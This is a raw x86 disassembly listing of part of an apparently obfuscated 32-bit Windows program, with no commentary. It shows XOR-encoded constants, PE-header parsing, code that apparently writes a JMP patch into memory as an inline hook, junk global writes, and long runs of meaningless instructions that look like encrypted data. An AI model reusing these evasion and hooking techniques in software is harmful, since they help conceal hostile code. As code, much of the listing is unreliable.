  4061ea:	push   eax
  4061eb:	mov    eax,ds:0x4091c0
  4061f0:	push   0x409116
  4061f5:	push   DWORD PTR [eax]
  4061f7:	call   0x406f1d
  4061fc:	and    DWORD PTR [ebp+0xc],0x0
  406200:	mov    eax,DWORD PTR [ebp-0x10]
  406203:	sub    eax,DWORD PTR [ebp+0xc]
  406206:	push   eax
  406207:	mov    eax,DWORD PTR [ebp+0x10]
  40620a:	add    eax,DWORD PTR [ebp+0xc]
  40620d:	push   eax
  40620e:	call   0x40196f
  406213:	inc    DWORD PTR [ebp+0xc]
  406216:	cmp    DWORD PTR [ebp+0xc],0x52
  40621a:	jb     0x406200
  406220:	mov    eax,DWORD PTR [ebp-0x8]
  406223:	mov    eax,ds:0x4091a0
  406228:	mov    DWORD PTR [ebp+0x10],eax
  40622b:	mov    eax,ds:0x4092ac
  406230:	mov    DWORD PTR [ebp-0x68],eax
  406233:	mov    DWORD PTR [ebp+0xc],0xf89c8535
  40623a:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  406241:	mov    eax,DWORD PTR [ebp+0xc]
  406244:	xor    eax,esi
  406246:	add    eax,ebx
  406248:	mov    DWORD PTR [ebp-0x7c],eax
  40624b:	mov    DWORD PTR [ebp-0x70],0xf89cb535
  406252:	mov    DWORD PTR [ebp-0x84],0xf89f0535
  40625c:	mov    DWORD PTR [ebp-0x78],edi
  40625f:	mov    DWORD PTR [ebp-0x64],0xf89c85d5
  406266:	mov    eax,DWORD PTR [ebp+0xc]
  406269:	xor    eax,esi
  40626b:	add    eax,ebx
  40626d:	mov    DWORD PTR [ebp-0x38],eax
  406270:	mov    DWORD PTR [ebp-0x48],0xf89c8530
  406277:	mov    BYTE PTR [ebp-0x29],0x57
  40627b:	mov    eax,DWORD PTR [ebp+0xc]
  40627e:	xor    eax,esi
  406280:	add    eax,ebx
  406282:	mov    DWORD PTR [ebp-0x38],eax
  406285:	mov    eax,DWORD PTR [ebp-0x64]
  406288:	xor    eax,esi
  40628a:	add    eax,ebx
  40628c:	push   eax
  40628d:	mov    eax,DWORD PTR [ebp-0x70]
  406290:	xor    eax,esi
  406292:	add    eax,ebx
  406294:	push   eax
  406295:	mov    eax,DWORD PTR [ebp-0x48]
  406298:	xor    eax,esi
  40629a:	add    eax,ebx
  40629c:	push   eax
  40629d:	lea    eax,[ebp-0x10c]
  4062a3:	push   eax
  4062a4:	push   DWORD PTR [ebp+0xc]
  4062a7:	push   DWORD PTR [ebp-0x4]
  4062aa:	call   0x40467f
  4062af:	test   eax,eax
  4062b1:	je     0x4062e2
  4062b7:	lea    eax,[ebp-0x10c]
  4062bd:	push   eax
  4062be:	mov    eax,DWORD PTR [ebp-0x4]
  4062c1:	xor    eax,esi
  4062c3:	add    eax,ebx
  4062c5:	push   eax
  4062c6:	mov    eax,DWORD PTR [ebp+0x10]
  4062c9:	add    eax,0xaa
  4062ce:	push   eax
  4062cf:	mov    eax,DWORD PTR [ebp+0x10]
  4062d2:	mov    eax,DWORD PTR [eax+0x198]
  4062d8:	push   DWORD PTR [eax]
  4062da:	call   0x406f1d
  4062df:	mov    DWORD PTR [ebp-0x24],eax
  4062e2:	cmp    DWORD PTR [ebp-0x24],0x0
  4062e6:	lea    edi,[ebp+0x4]
  4062e9:	mov    DWORD PTR [ebp-0x7c],edi
  4062ec:	je     0x4063b6
  4062f2:	lea    eax,[ebp-0x38]
  4062f5:	push   eax
  4062f6:	mov    eax,DWORD PTR [ebp-0x78]
  4062f9:	xor    eax,esi
  4062fb:	add    eax,ebx
  4062fd:	push   eax
  4062fe:	mov    eax,DWORD PTR [ebp-0x48]
  406301:	xor    eax,esi
  406303:	add    eax,ebx
  406305:	push   eax
  406306:	push   DWORD PTR [ebp-0x24]
  406309:	lea    eax,[ebp-0x10c]
  40630f:	push   eax
  406310:	push   DWORD PTR [ebp+0xc]
  406313:	push   DWORD PTR [ebp-0x4]
  406316:	call   0x404cef
  40631b:	test   eax,eax
  40631d:	je     0x40634b
  406323:	lea    eax,[ebp-0x10c]
  406329:	push   eax
  40632a:	mov    eax,DWORD PTR [ebp-0x4]
  40632d:	xor    eax,esi
  40632f:	add    eax,ebx
  406331:	push   eax
  406332:	mov    eax,DWORD PTR [ebp+0x10]
  406335:	add    eax,0xee
  40633a:	push   eax
  40633b:	mov    eax,DWORD PTR [ebp+0x10]
  40633e:	mov    eax,DWORD PTR [eax+0x198]
  406344:	push   DWORD PTR [eax]
  406346:	call   0x406f1d
  40634b:	mov    ecx,DWORD PTR [ebp-0x48]
  40634e:	xor    ecx,esi
  406350:	mov    eax,0xffcd8d62
  406355:	sub    eax,ecx
  406357:	sub    eax,DWORD PTR [ebp-0x24]
  40635a:	mov    ecx,DWORD PTR [ebp-0x68]
  40635d:	add    ecx,eax
  40635f:	mov    eax,DWORD PTR [ebp-0x24]
  406362:	mov    DWORD PTR [eax+0x1],ecx
  406365:	mov    al,BYTE PTR [ebp-0x29]
  406368:	mov    ecx,DWORD PTR [ebp-0x24]
  40636b:	xor    al,0x49
  40636d:	sub    al,0x35
  40636f:	mov    BYTE PTR [ecx],al
  406371:	lea    eax,[ebp-0x24]
  406374:	inc    BYTE PTR [eax]
  406376:	inc    eax
  406377:	push   eax
  406378:	pop    ecx
  406379:	dec    ecx
  40637a:	xchg   ecx,edx
  40637c:	dec    BYTE PTR [edx]
  40637e:	push   DWORD PTR [ebp+0x10]
  406381:	mov    eax,ds:0x40925c
  406386:	mov    eax,DWORD PTR [eax]
  406388:	push   DWORD PTR [eax]
  40638a:	lea    eax,ds:0x409278
  406390:	push   DWORD PTR [eax]
  406392:	lea    eax,ds:0x409024
  406398:	push   DWORD PTR [eax]
  40639a:	lea    eax,ds:0x409258
  4063a0:	push   DWORD PTR [eax]
  4063a2:	lea    eax,ds:0x409390
  4063a8:	push   DWORD PTR [eax]
  4063aa:	xchg   ebx,edx
  4063ac:	inc    ebx
  4063ad:	inc    ebx
  4063ae:	sub    ebx,0x3
  4063b1:	push   ebx
  4063b2:	pop    eax
  4063b3:	call   DWORD PTR [eax+0x1]
  4063b6:	mov    DWORD PTR [ebp-0x6c],edi
  4063b9:	mov    eax,DWORD PTR [ebp-0x3c]
  4063bc:	mov    eax,DWORD PTR [ebp-0x18]
  4063bf:	push   DWORD PTR [ebp-0x20]
  4063c2:	lea    eax,[ebp-0x6c]
  4063c5:	push   eax
  4063c6:	call   0x4034f6
  4063cb:	mov    eax,ds:0x4091a0
  4063d0:	push   0x4
  4063d2:	add    eax,0x1cc
  4063d7:	push   eax
  4063d8:	lea    eax,[ebp-0x3c]
  4063db:	push   eax
  4063dc:	call   0x402c87
  4063e1:	mov    eax,DWORD PTR [ebp-0x3c]
  4063e4:	mov    eax,DWORD PTR [eax]
  4063e6:	pop    edi
  4063e7:	pop    esi
  4063e8:	pop    ebx
  4063e9:	leave  
  4063ea:	ret    0xc
  4063ed:	push   ebp
  4063ee:	mov    ebp,esp
  4063f0:	sub    esp,0x20
  4063f3:	leave  
  4063f4:	ret    0x4
  4063f7:	push   ebp
  4063f8:	mov    ebp,esp
  4063fa:	push   ecx
  4063fb:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  406402:	sub    eax,DWORD PTR ds:0x4292d9
  406408:	mov    eax,DWORD PTR [ebp+0x8]
  40640b:	or     DWORD PTR ds:0x42759c,0x4292bd
  406415:	mov    al,BYTE PTR [eax]
  406417:	add    al,0x35
  406419:	and    DWORD PTR ds:0x427cf7,0x42c89e
  406423:	xor    al,0x49
  406425:	mov    DWORD PTR ds:0x4292a9,0x8ce
  40642f:	cmp    al,0xcb
  406431:	mov    DWORD PTR ds:0x4292d5,0x323c
  40643b:	jne    0x4064e2
  406441:	and    DWORD PTR ds:0x4292c1,0x0
  40644b:	xor    ecx,ecx
  40644d:	or     ecx,DWORD PTR ds:0x4292c1
  406453:	inc    ecx
  406454:	mov    DWORD PTR ds:0x4292c1,ecx
  40645a:	cmp    DWORD PTR ds:0x4292c1,0xa
  406461:	jne    0x40647a
  406467:	push   DWORD PTR [ebp-0x18]
  40646a:	push   0x641f
  40646f:	push   0x4275a8
  406474:	call   DWORD PTR ds:0x427ac3
  40647a:	cmp    DWORD PTR ds:0x4292c1,0x9
  406481:	jne    0x406496
  406487:	xor    ecx,ecx
  406489:	or     ecx,DWORD PTR ds:0x4292c1
  40648f:	inc    ecx
  406490:	mov    DWORD PTR ds:0x4292c1,ecx
  406496:	cmp    DWORD PTR ds:0x4292c1,0x1d
  40649d:	jb     0x40644b
  4064a3:	mov    eax,DWORD PTR [ebp+0x8]
  4064a6:	mov    ecx,DWORD PTR [ebp+0x8]
  4064a9:	add    ecx,DWORD PTR [eax+0x3c]
  4064ac:	mov    edx,0x7510857
  4064b1:	mov    DWORD PTR [ebp+0x8],ecx
  4064b4:	mov    eax,DWORD PTR [ebp-0x4]
  4064b7:	xor    eax,edx
  4064b9:	push   esi
  4064ba:	mov    esi,DWORD PTR [ebp+0x8]
  4064bd:	mov    ecx,0x32729e
  4064c2:	add    eax,ecx
  4064c4:	cmp    DWORD PTR [esi+0x54],eax
  4064c7:	pop    esi
  4064c8:	je     0x4064d6
  4064ce:	mov    eax,DWORD PTR [ebp+0x8]
  4064d1:	jmp    0x4064ef
  4064d6:	mov    eax,DWORD PTR [ebp-0x4]
  4064d9:	xor    eax,edx
  4064db:	add    eax,ecx
  4064dd:	jmp    0x4064ef
  4064e2:	mov    eax,DWORD PTR [ebp-0x4]
  4064e5:	xor    eax,0x7510857
  4064ea:	add    eax,0x32729e
  4064ef:	leave  
  4064f0:	ret    0x4
  4064f3:	push   ebp
  4064f4:	mov    ebp,esp
  4064f6:	push   ecx
  4064f7:	push   ecx
  4064f8:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  4064ff:	xor    DWORD PTR ds:0x427d1b,0x4292a5
  406509:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  406510:	mov    eax,DWORD PTR [ebp-0x4]
  406513:	push   esi
  406514:	mov    esi,DWORD PTR [ebp-0x8]
  406517:	xor    DWORD PTR ds:0x427d03,0x39
  406521:	jmp    0x40669a
  406526:	mov    al,cs:0xfbf5fbf3
  40652c:	data16 jge 0x40659b
  40652f:	inc    ecx
  406530:	xor    eax,0x423585e
  406535:	inc    eax
  406536:	jg     0x406561
  406538:	jl     0x4065b6
  40653a:	fdivr  DWORD PTR [edi+0x7c]
  40653d:	jl     0x40657d
  40653f:	sbb    al,0xd2
  406541:	xor    eax,0x102a87a6
  406546:	les    ebp,FWORD PTR [edx-0x647f1535]
  40654c:	pop    edi
  40654d:	and    esi,DWORD PTR [edx+0x7d]
  406550:	pop    esp
  406551:	adc    DWORD PTR [eax],0x95c8d748
  406557:	fmul   DWORD PTR [edi]
  406559:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40655a:	cmc    
  40655b:	ja     0x4065b6
  40655d:	call   0xd469:0x3b70fb81
  406564:	cmp    DWORD PTR [edx-0x343c2e0d],ecx
  40656a:	lahf   
  40656b:	xor    ebp,DWORD PTR [ebx+0x46]
  40656e:	cmp    DWORD PTR [ebx-0x50fc9c19],0xb383ecf1
  406578:	sar    DWORD PTR [esi+ecx*4],0x12
  40657c:	sub    BYTE PTR [esi],cl
  40657e:	push   es
  40657f:	rol    BYTE PTR [edx+0x15],1
  406582:	fsub   st,st(1)
  406584:	iret   
  406585:	jb     0x40650e
  406587:	pop    ebx
  406588:	xlat   BYTE PTR ds:[ebx]
  406589:	arpl   WORD PTR [bx],ax
  40658c:	mov    ch,0x6d
  40658e:	mov    esi,DWORD PTR [eax]
  406590:	jl     0x406579
  406592:	loopne 0x40655c
  406594:	into   
  406595:	out    dx,eax
  406596:	xor    DWORD PTR [eax-0x6e],0xffffffc8
  40659a:	add    di,WORD PTR [ebx-0x33]
  40659e:	clc    
  40659f:	xchg   edx,ebp
  4065a1:	or     BYTE PTR [ecx],bl
  4065a3:	aas    
  4065a4:	pop    esi
  4065a5:	aam    0x11
  4065a7:	ins    DWORD PTR es:[edi],dx
  4065a8:	mov    dh,0x54
  4065aa:	adc    DWORD PTR [esp+edi*4],0xfffffff4
  4065ae:	push   eax
  4065af:	dec    ebx
  4065b1:	push   esp
  4065b2:	fcomip st,st(1)
  4065b4:	test   BYTE PTR [edx+0x448826a9],ch
  4065ba:	shl    BYTE PTR [eax+0x58ddb62a],1
  4065c0:	push   edx
  4065c1:	lods   eax,DWORD PTR ds:[esi]
  4065c2:	out    0x39,al
  4065c4:	push   0xffffffa3
  4065c6:	inc    ecx
  4065c7:	xchg   esi,eax
  4065c8:	xor    ebx,edi
  4065ca:	dec    ecx
  4065cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065cc:	mov    WORD PTR [esi-0x113b1d2c],es
  4065d2:	or     ebx,DWORD PTR [eax]
  4065d4:	xor    bh,ah
  4065d6:	aam    0x5e
  4065d8:	icebp  
  4065d9:	out    dx,al
  4065da:	enter  0xa6d4,0xbc
  4065de:	xchg   esp,eax
  4065df:	mov    dh,0xe4
  4065e1:	add    al,0xc1
  4065e3:	dec    DWORD PTR [ebx+0x5b]
  4065e6:	mov    ecx,0x43507495
  4065eb:	push   ecx
  4065ec:	sar    DWORD PTR [edi],0x27
  4065ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065f0:	call   0x75a8ccd3
  4065f5:	pop    esp
  4065f6:	pop    ds
  4065f7:	dec    eax
  4065f8:	daa    
  4065f9:	mul    BYTE PTR [eax+0x78]
  4065fc:	mov    bl,0xc7
  4065fe:	fdivr  st,st(0)
  406600:	dec    edi
  406601:	inc    ebp
  406602:	add    BYTE PTR [ebx],bl
  406604:	cmp    dh,BYTE PTR [ecx]
  406606:	sub    DWORD PTR [edx],esp
  406608:	xchg   esp,eax
  406609:	xchg   DWORD PTR [ecx+eiz*2+0xe114844],edx
  406610:	xor    eax,0x7312f05f
  406615:	cld    
  406616:	call   FWORD PTR [edi]
  406618:	loop   0x406610
  40661a:	push   esp
  40661b:	or     cl,BYTE PTR [ebp-0x66]
  40661e:	shl    DWORD PTR ds:0x8c7e01d4,1
  406624:	mov    esi,0xbc0cac7e
  406629:	cmp    DWORD PTR [eax],esi
  40662b:	sub    BYTE PTR [edi],0xfd
  40662e:	ss mov esi,0xc5f8c674
  406634:	inc    ecx
  406635:	jns    0x40661c
  406637:	std    
  406638:	dec    DWORD PTR [edi+0x1e]
  40663b:	sub    al,0x3b
  40663d:	sbb    bl,bl
  40663f:	sub    eax,0xc37599c4
  406644:	jle    0x4066ad
  406646:	jl     0x406625
  406648:	jmp    0x75b64765
  40664d:	dec    esi
  40664e:	xor    al,0xde
  406650:	fild   QWORD PTR [eax+0x7c9a82bf]
  406656:	fistp  WORD PTR [esp+ebp*8+0x23f30d4c]
  40665d:	inc    ecx
  40665e:	jmp    0x32ad:0x5810c582
  406665:	jp     0x406617
  406667:	icebp  
  406668:	adc    BYTE PTR [esi],0x47
  40666b:	and    bh,cl
  40666d:	outs   dx,DWORD PTR ds:[esi]
  40666e:	(bad)  
  40666f:	mov    al,0x8
  406671:	mov    edi,0xdee0aa02
  406676:	add    BYTE PTR [eax],dl
  406678:	jns    0x4066e8
  40667a:	adc    esi,DWORD PTR [eax]
  40667c:	adc    DWORD PTR [ebx+0xe3d5d09],esp
  406682:	jle    0x4066e1
  406684:	rcl    ebp,0x3c
  406687:	xchg   ecx,eax
  406688:	js     0x40666e
  40668a:	fwait
  40668b:	pop    ebp
  40668c:	xor    edx,eax
  40668e:	pop    ebp
  40668f:	dec    ebx
  406690:	sub    eax,0xa332f969
  406695:	sub    ch,BYTE PTR [eax]
  406697:	dec    esi
  406698:	into   
  406699:	cmp    edi,DWORD PTR [edx+0x7510857]
  40669f:	xor    eax,edx
  4066a1:	adc    DWORD PTR ds:0x4292a5,0x7cf1
  4066ab:	xor    esi,edx
  4066ad:	mov    ecx,0x32729e
  4066b2:	sbb    DWORD PTR ds:0x42c89a,0x427594
  4066bc:	add    esi,ecx
  4066be:	or     DWORD PTR ds:0x42c892,0x2710
  4066c8:	add    eax,ecx
  4066ca:	sbb    DWORD PTR ds:0x4292b5,0x4275ac
  4066d4:	imul   eax,esi
  4066d7:	mov    DWORD PTR ds:0x42c896,0x5e2a
  4066e1:	mov    esi,DWORD PTR [ebp+0xc]
  4066e4:	mov    DWORD PTR ds:0x427d03,0x704c
  4066ee:	cmp    esi,eax
  4066f0:	mov    DWORD PTR ds:0x427d1f,0x38e6
  4066fa:	jne    0x4068f9
  406700:	mov    DWORD PTR ds:0x4275b0,0x11
  40670a:	cmp    DWORD PTR ds:0x4275b0,0x0
  406711:	je     0x40675a
  406717:	cmp    DWORD PTR ds:0x4275b0,0x1b
  40671e:	jne    0x406746
  406724:	push   DWORD PTR [ebp-0x28]
  406727:	push   0x3cc8
  40672c:	push   0x5307
  406731:	push   0x1b9a
  406736:	push   0x3e4a
  40673b:	push   0x4274
  406740:	call   DWORD PTR ds:0x427c6b
  406746:	xor    esi,esi
  406748:	or     esi,DWORD PTR ds:0x4275b0
  40674e:	dec    esi
  40674f:	mov    DWORD PTR ds:0x4275b0,esi
  406755:	jmp    0x40670a
  40675a:	mov    eax,DWORD PTR [ebp-0x4]
  40675d:	xor    esi,esi
  40675f:	xor    esi,DWORD PTR ds:0x42c8de
  406765:	mov    esi,DWORD PTR [esi]
  406767:	adc    DWORD PTR ds:0x4292d5,esi
  40676d:	mov    esi,DWORD PTR [ebp-0x8]
  406770:	xor    eax,edx
  406772:	xor    esi,edx
  406774:	add    eax,ecx
  406776:	add    esi,ecx
  406778:	jmp    0x4068f1
  40677d:	dec    eax
  40677e:	cmp    al,0x31
  406780:	and    ecx,DWORD PTR [ebp+0x25]
  406783:	jp     0x4067ec
  406785:	pop    edx
  406786:	inc    esp
  406787:	push   cs
  406788:	and    eax,0x7aeb3f7f
  40678d:	fld    TBYTE PTR [eax]
  40678f:	jl     0x40680d
  406791:	fdivr  DWORD PTR [edi+0x7c]
  406794:	jl     0x40671c
  406796:	xchg   edi,eax
  406797:	pop    es
  406798:	inc    eax
  406799:	sbb    eax,0xe25167b1
  40679e:	dec    esp
  40679f:	adc    edi,edx
  4067a1:	(bad)
  4067a5:	std    
  4067a6:	push   ecx
  4067a7:	and    eax,0x36ae5a23
  4067ac:	sbb    dl,BYTE PTR [ebp-0x8]
  4067af:	inc    eax
  4067b0:	inc    ecx
  4067b1:	cmp    DWORD PTR [edi+0x352c8b7f],0xffffffac
  4067b8:	adc    DWORD PTR [ebp-0xd],edi
  4067bb:	retf   
  4067bc:	(bad)  
  4067bd:	push   ebx
  4067be:	add    eax,0xc246719b
  4067c3:	xchg   ebp,esp
  4067c5:	jge    0x4067b1
  4067c7:	sar    BYTE PTR [edx],1
  4067c9:	mov    ebp,0xfcfc92e3
  4067ce:	fs inc ebx
  4067d0:	icebp  
  4067d1:	push   ebp
  4067d2:	cwde   
  4067d3:	ficom  DWORD PTR [edx+0x154195f3]
  4067d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067da:	iret   
  4067db:	pop    es
  4067dc:	inc    BYTE PTR [ecx+0x5e]
  4067df:	js     0x4067cc
  4067e1:	cmp    al,0x9f
  4067e3:	xchg   ebx,ecx
  4067e5:	popa   
  4067e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067e7:	in     al,0x9f
  4067e9:	sbb    eax,ebp
  4067eb:	cmp    BYTE PTR [edi+ecx*4+0x6c],ch
  4067ef:	stc    
  4067f0:	pop    esi
  4067f1:	lahf   
  4067f2:	(bad)  
  4067f4:	jp     0x406850
  4067f6:	xor    dl,BYTE PTR [esi-0x63e2e0e5]
  4067fc:	cmp    DWORD PTR ds:0x71bb3514,ecx
  406802:	mov    ebx,0x9b218d8e
  406807:	sub    BYTE PTR [edx+0x39f2d39a],ch
  40680d:	ins    DWORD PTR es:[edi],dx
  40680e:	mov    bl,0x66
  406810:	or     eax,0x26735aca
  406815:	sbb    ebp,DWORD PTR [ecx]
  406817:	jle    0x4067d5
  406819:	cmp    DWORD PTR [edx],0x22b63d52
  40681f:	sbb    al,0x68
  406821:	iret   
  406822:	push   esp
  406823:	push   ds
  406824:	adc    edi,edx
  406826:	in     eax,dx
  406827:	jp     0x4067b4
  406829:	fdivr  DWORD PTR [ecx+0x36]
  40682c:	adc    eax,0x948fba80
  406831:	jns    0x4067b5
  406833:	lods   eax,DWORD PTR ds:[esi]
  406834:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406835:	mov    ?,WORD PTR [eax+esi*8-0x22]
  406839:	push   eax
  40683a:	cdq    
  40683b:	les    esp,FWORD PTR [edi]
  40683d:	mov    ch,0x83
  40683f:	cmp    esi,DWORD PTR [eax+0x17]
  406842:	popf   
  406843:	mov    edi,0x4e2b463
  406848:	loopne 0x4067e5
  40684a:	fadd   QWORD PTR [eax-0x32]
  40684d:	loop   0x4067fc
  40684f:	in     eax,dx
  406850:	call   0xdb88c9c3
  406855:	push   esp
  406856:	bound  ebx,QWORD PTR [edx+0x117ec9f9]
  40685c:	nop
  40685d:	fidiv  WORD PTR [ebx+0x14]
  406860:	xchg   ebp,eax
  406861:	stos   DWORD PTR es:[edi],eax
  406862:	push   esi
  406863:	lds    ebp,FWORD PTR [esi]
  406865:	jne    0x406832
  406867:	and    eax,0x7bc66ca9
  40686c:	(bad)  
  40686d:	je     0x4068d3
  40686f:	inc    ecx
  406870:	jnp    0x4068b8
  406872:	cmp    DWORD PTR [esi-0x1dbc7b9e],ebx
  406878:	enter  0xf3ad,0x4
  40687c:	sub    esi,esp
  40687e:	push   ecx
  40687f:	and    eax,0x1e04916f
  406884:	scas   al,BYTE PTR es:[edi]
  406885:	call   0x3e2d7f69
  40688a:	int3   
  40688b:	or     BYTE PTR [ebx+0x7d],cl
  40688e:	data16 add al,0x3e
  406891:	mov    ds:0x6f5f5f7f,al
  406896:	in     al,0x6
  406898:	nop
  406899:	leave  
  40689a:	fimul  DWORD PTR [eax+0x1d]
  40689d:	mov    bh,0x7a
  40689f:	mov    ah,0x6
  4068a1:	lods   al,BYTE PTR ds:[esi]
  4068a2:	das    
  4068a3:	jl     0x40686e
  4068a5:	ins    DWORD PTR es:[edi],dx
  4068a6:	aas    
  4068a7:	pushf  
  4068a8:	push   ebx
  4068a9:	and    ecx,DWORD PTR [ecx-0x63]
  4068ac:	mov    al,BYTE PTR ss:[esi]
  4068af:	cli    
  4068b0:	cld    
  4068b1:	cmp    ch,BYTE PTR [eax]
  4068b3:	fsub   DWORD PTR [ecx]
  4068b5:	nop    DWORD PTR [ecx+0x11]
  4068b9:	fnstsw WORD PTR [ebx]
  4068bb:	jge    0x406876
  4068bd:	sub    ecx,esp
  4068bf:	das    
  4068c0:	push   ecx
  4068c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068c2:	pop    ebp
  4068c3:	or     DWORD PTR [esi-0x83cfda6],ecx
  4068c9:	cs in  al,dx
  4068cb:	sub    DWORD PTR [esi+0x12],0xffffffde
  4068cf:	or     BYTE PTR [ecx+0x56be9593],ch
  4068d5:	adc    BYTE PTR [edi+0x2cd85cc5],bh
  4068db:	test   BYTE PTR [ecx],dl
  4068dd:	xchg   BYTE PTR [esi-0x80],ch
  4068e0:	or     eax,0x6db9bb0f
  4068e5:	mov    dl,0xa9
  4068e7:	rcr    BYTE PTR [edi+eiz*8-0xb84f5f9],0x59
  4068ef:	out    dx,al
  4068f0:	jo     0x406901
  4068f2:	scas   eax,DWORD PTR es:[edi]
  4068f3:	(bad)  
  4068f4:	jmp    0x406f18
  4068f9:	mov    eax,DWORD PTR [ebp+0xc]
  4068fc:	jmp    0x406a75
  406901:	mov    eax,0x65210ec9
  406906:	stc    
  406907:	mov    ebx,0x4f39e44d
  40690c:	pop    ebp
  40690d:	sub    bl,BYTE PTR [ebx+edi*1]
  406910:	shl    DWORD PTR [edi-0x278383d5],0x7f
  406917:	jl     0x406995
  406919:	sub    ebp,esi
  40691b:	ins    DWORD PTR es:[edi],dx
  40691c:	sbb    DWORD PTR [esi+0xd00877e],edx
  406922:	xchg   edx,eax
  406923:	or     eax,0x7b4020e6
  406928:	ret    
  406929:	inc    edx
  40692a:	inc    esi
  40692b:	lahf   
  40692c:	cwde   
  40692d:	rol    BYTE PTR [edx],cl
  40692f:	cmp    bl,BYTE PTR [ebx-0x388d7fb0]
  406935:	test   al,0x69
  406937:	push   0xd8f69e1b
  40693c:	mov    ds:0xa007187e,eax
  406941:	fidiv  WORD PTR [ebx+0x39aa4b51]
  406947:	push   ebp
  406948:	stos   DWORD PTR es:[edi],eax
  406949:	inc    esp
  40694a:	ret    
  40694b:	out    0x85,al
  40694d:	xchg   ebx,eax
  40694e:	xor    dh,BYTE PTR [ebx]
  406950:	loope  0x40691b
  406952:	in     eax,dx
  406953:	call   0xd6e4:0x3dc479fc
  40695a:	ins    DWORD PTR es:[edi],dx
  40695b:	cwde   
  40695c:	loopne 0x406900
  40695e:	push   0xcb7bffe2
  406963:	mov    DWORD PTR [eax+edi*4-0x6],ebx
  406967:	jle    0x4068f1
  406969:	inc    eax
  40696a:	pop    edx
  40696b:	adc    DWORD PTR [eax-0x64],0x89ae7aab
  406972:	adc    DWORD PTR [eax+edi*8+0x7b8ceef7],edx
  406979:	retf   
  40697a:	fdiv   st,st(6)
  40697c:	cmc    
  40697d:	out    dx,eax
  40697e:	into   
  40697f:	cdq    
  406980:	outs   dx,DWORD PTR ds:[esi]
  406981:	cmc    
  406982:	lahf   
  406983:	cli    
  406984:	rcr    ecx,cl
  406986:	scas   al,BYTE PTR es:[edi]
  406987:	xlat   BYTE PTR ds:[ebx]
  406988:	push   ds
  406989:	scas   eax,DWORD PTR es:[edi]
  40698a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40698b:	inc    edx
  40698c:	mov    bh,0x96
  40698e:	fdivrp st(6),st
  406990:	sub    eax,0x282e6353
  406995:	in     eax,0xfd
  406997:	and    dl,cl
  406999:	mov    DWORD PTR [ecx],esp
  40699b:	add    DWORD PTR [edi],esi
  40699d:	mov    eax,ds:0x70cda497
  4069a2:	push   ds
  4069a3:	outs   dx,DWORD PTR ds:[esi]
  4069a4:	push   0x79
  4069a6:	mov    cl,0x9
  4069a8:	mov    al,ds:0xace85235
  4069ad:	icebp  
  4069ae:	xor    dl,dl
  4069b0:	dec    eax
  4069b1:	ud1    esp,DWORD PTR [ebx+0x3a8d1564]
  4069b8:	and    ebp,DWORD PTR [ebx+0x3f]
  4069bb:	ja     0x4069ed
  4069bd:	jp     0x406a0e
  4069bf:	jnp    0x40695f
  4069c1:	xchg   esi,eax
  4069c2:	test   DWORD PTR [edx-0x5ef73314],edi
  4069c8:	lea    eax,[edx-0x63]
  4069cb:	sub    esi,0xf382ef30
  4069d1:	cmp    ebp,DWORD PTR [esi]
  4069d3:	xor    esp,DWORD PTR ds:0x3ee5be37
  4069d9:	cmp    DWORD PTR [edx+0x16],ebp
  4069dc:	popa   
  4069dd:	and    al,BYTE PTR [ecx]
  4069df:	es jl  0x406985
  4069e2:	bound  esi,QWORD PTR [edx*1-0x15af64dc]
  4069e9:	jecxz  0x406a42
  4069eb:	dec    ebp
  4069ec:	(bad)  
  4069ed:	mov    al,0x9f
  4069ef:	inc    edx
  4069f0:	js     0x406a5f
  4069f2:	adc    eax,0xa15f9f0b
  4069f7:	mov    ds:0xa94dbdd1,al
  4069fc:	mov    edi,0x1728876a
  406a01:	pop    esp
  406a02:	adc    ecx,DWORD PTR [esp+edx*4-0x3dfdddd5]
  406a09:	call   0x4d7e08c0
  406a0e:	xchg   esp,eax
  406a0f:	inc    esp
  406a10:	ret    0x53dd
  406a13:	xor    BYTE PTR [ecx+0x7fca9637],bh
  406a19:	inc    esp
  406a1a:	jmp    0x951d0deb
  406a1f:	shr    DWORD PTR [ebp-0x526c77ff],1
  406a25:	mov    eax,ds:0xcbc79a5b
  406a2a:	(bad)  
  406a2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a2c:	ins    BYTE PTR es:[edi],dx
  406a2d:	dec    BYTE PTR [eax]
  406a2f:	push   ecx
  406a30:	or     eax,0x3c5902b8
  406a35:	mov    edi,0x4369b052
  406a3a:	cmp    BYTE PTR [ebx],0xf8
  406a3d:	jecxz  0x406a26
  406a3f:	lods   al,BYTE PTR ds:[esi]
  406a40:	ins    DWORD PTR es:[edi],dx
  406a41:	jnp    0x406a8f
  406a43:	iret   
  406a44:	pop    ebp
  406a45:	pop    edx
  406a46:	or     al,BYTE PTR [edi+0x4136962b]
  406a4c:	add    bl,BYTE PTR [ecx+ebx*8-0x70]
  406a50:	adc    eax,0x22526ea8
  406a55:	pop    esp
  406a56:	mov    ah,0x53
  406a58:	pop    ebp
  406a59:	shl    DWORD PTR [ebp-0x2c],cl
  406a5c:	inc    esp
  406a5d:	and    BYTE PTR [edi+eax*8-0x6e],ah
  406a61:	adc    eax,0x79b2add7
  406a66:	mov    al,0x79
  406a68:	pop    esp
  406a69:	jl     0x406a55
  406a6b:	xchg   ecx,eax
  406a6c:	mov    al,0x72
  406a6e:	repnz xchg ebx,eax
  406a70:	gs scas eax,DWORD PTR es:[edi]
  406a72:	mov    al,ds:0x408b7dc9
  406a77:	js     0x406a02
  406a79:	inc    ebp
  406a7a:	or     al,0x8b
  406a7c:	inc    ebp
  406a7d:	cld    
  406a7e:	mov    esi,DWORD PTR [ebp-0x8]
  406a81:	xor    eax,edx
  406a83:	xor    esi,edx
  406a85:	add    eax,ecx
  406a87:	add    esi,ecx
  406a89:	imul   eax,esi
  406a8c:	jmp    0x406c05
  406a91:	xorps  xmm5,XMMWORD PTR [edi]
  406a94:	lds    esp,FWORD PTR [edi+0x5d]
